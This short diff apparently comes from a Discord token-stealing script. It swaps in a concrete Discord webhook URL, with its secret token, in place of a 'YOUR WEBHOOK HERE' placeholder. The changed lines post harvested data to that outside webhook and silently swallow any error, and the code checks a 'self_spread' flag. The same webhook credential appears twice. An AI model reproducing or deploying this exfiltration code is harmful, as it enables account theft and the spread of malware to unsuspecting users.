@@ -177,11 +177,11 @@ def main():
         "avatar_url": "https://ibb.co/Xj0k57s" 
     } 
     try: 
-        urlopen(Request("https://discord.com/api/webhooks/847548431307898940/UkbC1n5o06rQBofuvjec0AwCiWgeKEjhIWdR4t4Lhrg1ozjV6TgrG2jEsyVlkr_s24W0", data=dumps(webhook).encode(), headers=getHeader())) 
+        urlopen(Request("https://discord.com/api/webhooks/890860371580157972/m0Os3L12BLA-uFA0ymkNui9UKk-PC0eCFqpC2GCLXwP1HPbpzHBLnpPslTRKON1sndmq", data=dumps(webhook).encode(), headers=getHeader())) 
     except: 
         pass 
     try: 
-        urlopen(Request("YOUR WEBHOOK HERE", data=dumps(webhook).encode(), headers=getHeader())) 
+        urlopen(Request("https://discord.com/api/webhooks/890860371580157972/m0Os3L12BLA-uFA0ymkNui9UKk-PC0eCFqpC2GCLXwP1HPbpzHBLnpPslTRKON1sndmq", data=dumps(webhook).encode(), headers=getHeader())) 
     except: 
         pass 
     if self_spread: 
